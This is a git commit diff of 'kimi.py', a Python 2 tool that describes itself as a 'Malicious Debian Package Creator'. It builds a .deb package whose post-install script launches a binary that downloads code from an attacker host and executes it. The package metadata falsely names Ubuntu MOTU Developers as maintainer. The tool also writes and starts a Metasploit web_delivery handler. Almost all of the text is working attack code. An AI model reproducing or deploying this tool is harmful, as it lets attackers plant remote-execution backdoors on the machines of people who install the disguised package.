f36df2bffd7d71167380b7f110e0dd14edacdd05
Chaitanya Haritash <isiamgreat.haritash@gmail.com>
2019-04-24 15:34:23 +0530

    beta
    beta update

--- kimi.py
+++ kimi.py
@@ -1,5 +1,6 @@
-#!/usr/bin/env python
+#!/usr/bin/env python2
 
+__version__ = "1.2"
 # ____  __. .__             .__
 #|    |/ _| |__|   _____    |__|
 #|      <   |  |  /      \  |  |
@@ -39,128 +40,106 @@
 
 ##
 
-import os,time
-import argparse,sys
+import os,time,shutil
+import argparse
 
-def printer():
-     global banner
-     banner = """
+banner = r"""
  ____  __. .__             .__
 |    |/ _| |__|   _____    |__|
 |      <   |  |  /      \  |  |
 |    |  \  |  | |  Y Y   \ |  |
-|____|__ \ |__| |__|_|   / |__| Ver.1.1
+|____|__ \ |__| |__|_|   / |__| Ver {0}
         \/            \./Suspicious Shell Activity
         Malicious Debain Package Creator
         Coded by Chaitanya Haritash
         Twitter :: @bofheaded
-  """
-def main():
-  try:
-    print banner
-    parser = argparse.ArgumentParser()
-    parser.add_argument('-n','--name', help="Name for your package" , required="true")
-    parser.add_argument('-l','--lhost', help="LHOST, for Handler" , required="true")
-    parser.add_argument('-V','--vers', help="Version for package" , required="true")
-    parser.add_argument('-a','--arch', help="Architecture (i386/amd64)" , required="true")
-    global go
-    go = parser.parse_args()
-    global h
-    global j
-    global we
-    global uu
-    h = str(go.name)
-    j = str(go.name)+"_"+str(go.vers)
-    we = str(go.lhost)
-    uu = str(go.arch)
-    with open(h, "w+") as r:
-      payload = """
+  """.format(__version__)
+
+payload = """
 #!/bin/bash
-python -c "import urllib2; r = urllib2.urlopen('http://"""+str(go.lhost)+""":8080/SecPatch'); exec(r.read());"
+python -c "import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://lhost:8080/SecPatch');exec(r.read());"
+"""
 
-          """
-      k = r.write(payload)
-      o = open("postinst" , "a")
-      m = """
-
+def mkpost(name):
+	m = """
 #!/bin/bash
 
-chmod 2755 /usr/local/bin/"""+h+""" && /usr/local/bin/"""+h+""" &
+chmod 2755 /usr/local/bin/"""+name.replace(".deb","")+""" && /usr/local/bin/"""+name.replace(".deb","")+""" &
+"""
+	return m
 
-      """
-      o.write(m)
-      o.close()
-      os.system("chmod 0755 postinst")
-      print ""
-      print "kimi finally done with it ;) happy injecting !!"
-      print ""
-  except IOError:
-    print banner
-    print "[-] please provide valid arguments [-]"
-    print ""
-
-  #else:
-  # print banner
-
-def make_deb():
+def make_deb(name,arch,name_ver,ver):
   gen = """
 #!/bin/sh
-chmod u+x """+h+"""
+chmod u+x """+name+"""
 cat >> control << EOF
 
-Package: """+str(go.name)+"""
-Version: """+str(go.vers)+"""
+Package: """+name+"""
+Version: """+ver+"""
 Section: Games and Amusement
 Priority: optional
-Architecture: """+uu+"""
+Architecture: """+arch+"""
 Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
 Description: MDPC kimi (SSA-RedTeam development 2017)
 
 EOF
 
-mkdir -p """+j+"""/usr/local/bin
-cp """+h+""" """+j+"""/usr/local/bin
+mkdir -p """+name_ver+"""/usr/local/bin
+cp """+name+""" """+name_ver+""" /usr/local/bin
+mv /usr/local/bin/"""+name+""" /usr/local/bin/"""+name.replace(".deb","")+"""
 sleep 2
-mkdir -p """+j+"""/DEBIAN
-cp control """+j+"""/DEBIAN/control
-cp postinst """+j+"""/DEBIAN/postinst
+mkdir -p """+name_ver+"""/DEBIAN
+cp control """+name_ver+"""/DEBIAN/control
+cp postinst """+name_ver+"""/DEBIAN/postinst
 sleep 3
-dpkg-deb --build """+j+"""
-sleep 5
-rm -rf """+h+"""
-rm -rf control
-rm -rf postinst
-rm -rf """+j+"""
-rm -rf fro.sh
-
+dpkg-deb --build """+name_ver+"""
   """
-  er = open("fro.sh" , "w")
-  er.write(gen)
-  er.close()
+  os.system(gen)
+  time.sleep(2)
+  os.remove(name)
+  os.remove("control")
+  os.remove("postinst")
+  shutil.rmtree(name_ver)
+  print "All done!!"
 
-  os.system("chmod +x fro.sh")
-  os.system("./fro.sh")
-  os.system("sudo chmod 777 *.deb")
-
-def make_resource():
-
-    res = """
+def make_resource(lhost,uri):
+	res = """
 use exploit/multi/script/web_delivery
-set SRVHOST """+we+"""
-set LHOST """+we+"""
-set URIPATH /SecPatch
+set SRVHOST """+lhost+"""
+set LHOST """+lhost+"""
+set URIPATH """+uri+"""
 exploit
-    """
-    b = open("handler.rc" , "w")
-    b.write(res)
-    b.close()
-    print "execute handler: sudo msfconsole -r handler.rc"
-    time.sleep(2)
-    os.system("chmod 777 handler.rc")
-    os.system('xterm -e "sudo msfconsole -r handler.rc"')
-
+"""
+	b = open("handler.rc" , "w").write(res)
+	print "execute handler: sudo msfconsole -r handler.rc"
+	time.sleep(2)
+	os.system("chmod 777 handler.rc")
+	os.system('xterm -e "sudo msfconsole -q -r handler.rc"')
+def main():
+	print banner
+	parser = argparse.ArgumentParser()
+	parser.add_argument('-n','--name', help="Name for your package" , required="true")
+	parser.add_argument('-l','--lhost', help="LHOST, for Handler" , required="true")
+	parser.add_argument('-p','--lport', help="LPORT for Handler" , required="true")
+	parser.add_argument('-u','--uri', help="URI of handler" , required="true")
+	parser.add_argument('-V','--vers', help="Version for package" , required="true")
+	parser.add_argument('-a','--arch', help="Architecture (i386/amd64)" , required="true")
+	go = parser.parse_args()
+	if os.getuid() != 0:
+		print "Script requies root privileges for certain operations, aborting"
+	else:
+		try:
+			j = str(go.name)+"_"+str(go.vers)
+			mkpay= payload.replace("lhost",go.lhost).replace("SecPatch",go.uri).replace("8080",go.lport)
+			f = open(go.name,"w+").write(mkpay)
+			mkpost_script = open("postinst","a").write(mkpost(go.name))
+			os.system("chmod 0755 postinst")
+			print "[+] Building the package : ",go.name
+			time.sleep(2)
+			make_deb(str(go.name),str(go.arch),str(j),str(go.vers))
+			print "[+] msfconsole will start in few :)"
+			make_resource(go.lhost,go.uri)
+		except Exception as e:
+			print "Something is not going good : ",e
 if __name__ == '__main__':
-  printer()
-  main()
-  make_deb()
-  make_resource()
+	main()
